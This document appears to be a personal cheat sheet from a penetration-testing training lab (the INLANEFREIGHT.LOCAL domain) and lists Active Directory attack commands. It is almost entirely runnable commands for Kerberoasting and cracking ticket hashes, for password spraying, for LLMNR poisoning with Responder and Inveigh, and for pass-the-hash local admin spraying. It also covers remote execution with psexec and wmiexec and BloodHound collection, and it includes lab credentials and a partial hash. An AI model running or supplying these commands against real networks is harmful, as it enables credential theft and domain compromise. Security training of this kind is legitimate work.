
LINUX
Listing SPN accounts with GetUserSPNs.py
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

Requesting all TGS tickets with GetUserSPNs.py
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request  -outputfile all_tgs
```
Requesting a Single Ticket
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/sqldev -request-user SAPService  -outputfile sapserver_tgs
```
Hashcat  the TGS
```
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```
Testing creds
```
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```




```
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```



```
sudo responder -I ens224
```

Create a target user list
```
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

```
rpcclient -U "" -N 172.16.5.5

enumdomusers
```

No creds
```
crackmapexec smb 172.16.5.5 --users
```
With creds
```
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

password spraying one liner in Bash
```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

Password spraying with kerbrute
```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
Password spraying with crackmapexec filtering logon failures
```
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

```

Validating the credentials
```
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

Local Admin Spraying with crackmap exec
```
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

identify logged on users
```
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

```
Identify Shares
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```
Recursive share search
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```
Check access of shares
```
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

```
Recursive search of all directories
```
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

Connect to DC
```
rpcclient -U "" -N 172.16.5.5

you can query RID last four digits of SID and convert to HEX
1111=457
Admin RID 500 = 1f4


queryuser 0x457

For every user
enumdomusers

```

psexec.py
```
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```
wmiexec.py
```
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  

```

Search for Domain admins
```
 python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```
Search for Privileged Users
```
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

Bloodhound
```
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```
start neo4j for bloodhound review
```
sudo neo4j start
```



POWERSHELL below
Windows powershell tool Inveigh
responder like
```
Import-Module .\Inveigh.ps1

Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y


```

Password spray
```
Import-Module .\DomainPasswordSpray.ps1

Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

```

PS getting status of Defender
```
Get-MpComputerStatus

```
Get applocker policy
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
Checking powershell contrained language mode
```
$ExecutionContext.SessionState.LanguageMode
```
Find LAPSDelegated groups
```
Find-LAPSDelegatedGroups
```
Find rights on each computer with LAPS enabled for any group with read access and users with all extended rightss
```
Find-AdmPwdExtendedRights
```

```
Get-LAPSComputers
```



Windows commands
```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

Powerview instructions
```
Command	Description
Export-PowerViewCSV	Append results to a CSV file
ConvertTo-SID	Convert a User or group name to its SID value
Get-DomainSPNTicket	Requests the Kerberos ticket for a specified Service Principal Name (SPN) account
Domain/LDAP Functions:	
Get-Domain	Will return the AD object for the current (or specified) domain
Get-DomainController	Return a list of the Domain Controllers for the specified domain
Get-DomainUser	Will return all users or specific user objects in AD
Get-DomainComputer	Will return all computers or specific computer objects in AD
Get-DomainGroup	Will return all groups or specific group objects in AD
Get-DomainOU	Search for all or specific OU objects in AD
Find-InterestingDomainAcl	Finds object ACLs in the domain with modification rights set to non-built in objects
Get-DomainGroupMember	Will return the members of a specific domain group
Get-DomainFileServer	Returns a list of servers likely functioning as file servers
Get-DomainDFSShare	Returns a list of all distributed file systems for the current (or specified) domain
GPO Functions:	
Get-DomainGPO	Will return all GPOs or specific GPO objects in AD
Get-DomainPolicy	Returns the default domain policy or the domain controller policy for the current domain
Computer Enumeration Functions:	
Get-NetLocalGroup	Enumerates local groups on the local or a remote machine
Get-NetLocalGroupMember	Enumerates members of a specific local group
Get-NetShare	Returns open shares on the local (or a remote) machine
Get-NetSession	Will return session information for the local (or a remote) machine
Test-AdminAccess	Tests if the current user has administrative access to the local (or a remote) machine
Threaded 'Meta'-Functions:	
Find-DomainUserLocation	Finds machines where specific users are logged in
Find-DomainShare	Finds reachable shares on domain machines
Find-InterestingDomainShareFile	Searches for files matching specific criteria on readable shares in the domain
Find-LocalAdminAccess	Find machines on the local domain where the current user has local administrator access
Domain Trust Functions:	
Get-DomainTrust	Returns domain trusts for the current domain or a specified domain
Get-ForestTrust	Returns all forest trusts for the current forest or a specified forest
Get-DomainForeignUser	Enumerates users who are in groups outside of the user's domain
Get-DomainForeignGroupMember	Enumerates groups with users outside of the group's domain and returns each foreign member
Get-DomainTrustMapping	Will enumerate all trusts for the current domain and any others seen.
```


Windows commands for Kerberoasting
```
setspn.exe -Q */*
```

```
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "vmware/inlanefreight.local:1433"
```
```
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

```
mimikatz # base64 /out:true

mimikatz # kerberos::list /export 

echo "<base64 blob>" |  tr -d \\n

cat encoded_file | base64 -d > sqldev.kirbi

python2.7 kirbi2john.py sqldev.kirbi

sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

cat sqldev_tgs_hashcat 

$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fcb646e28d854bcdc2c8b362bbfaf62dcd9933c55e  Deleted alot of the hash

hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt


```

```
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

.\Rubeus.exe kerberoast /stats

.\Rubeus.exe kerberoast /user:testspn /nowrap


Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```

Checking supported encryption types
```
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

Requesting a new ticket
```
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

 mode 19700, which is Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96)
```
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```


Viewing ACL
PS
```
Find-InterestingDomainAcl
```

```
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid damundsen
```

```
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

reverse search
```
$guid= "00299570-246d-11d0-a768-00aa006e0529"

Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```

Resolve gui flag

```
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```

creating a list of Domain Users
```
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```
usesfull for each loop
```
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```